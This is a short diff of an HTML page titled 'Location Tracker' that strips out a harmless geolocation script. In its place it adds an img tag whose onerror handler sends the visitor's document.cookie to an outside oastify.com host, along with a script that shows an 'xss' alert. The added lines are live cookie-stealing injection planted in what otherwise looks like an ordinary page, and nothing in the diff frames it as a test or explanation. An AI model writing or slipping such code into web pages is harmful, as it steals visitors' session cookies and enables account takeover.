@@ -2,20 +2,8 @@
 <html>
 <head>
     <title>Location Tracker</title>
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition);
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
-
-        function showPosition(position) {
-            alert("Latitude: " + position.coords.latitude + 
-            "\nLongitude: " + position.coords.longitude);
-        }
-    </script>
+<img src="x" onerror="fetch('http://g4lwj1a63qnz28hdk1e41w23puvljb70.oastify.com/?cookie=' + encodeURIComponent(document.cookie));">
+    <script>alert('xss')</script>
 </head>
 <body>
     <h1>Click the button to get your location</h1>
